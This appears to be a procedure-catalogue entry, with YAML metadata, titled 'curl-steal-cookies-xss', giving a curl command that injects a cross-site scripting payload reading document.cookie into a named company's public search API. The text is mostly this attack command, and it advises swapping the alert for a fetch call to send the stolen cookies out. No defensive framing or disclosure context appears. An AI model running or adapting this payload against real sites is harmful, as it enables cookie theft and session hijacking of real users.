---
data: >-
  curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d
  "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<body
  onload=alert(document.cookie)>" --header "x-api-key: YOUR_API_KEY"
tags:
  - xss
  - cookie-theft
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 333b4d3a-871e-4a16-b14f-da3f7d1cd7c0
created_at: '2025-12-14T03:46:31.584Z'
updated_at: '2025-12-14T03:46:31.584Z'
verified: false
validated: true
submitted: true
---
# curl-steal-cookies-xss

## Command

```bash
curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<body onload=alert(document.cookie)>" --header "x-api-key: YOUR_API_KEY"
```

## Description

Injects payload to alert cookies via XSS. For exfil, modify to send data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "siteBaseUrl=...` | Cookie access payload | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Replace alert with fetch for exfil.

## Expected Output

Alert with cookie values in browser.

## Related

- [[Related Procedure: Exfiltrate Cookies with XSS Payload in siteBaseUrl]]
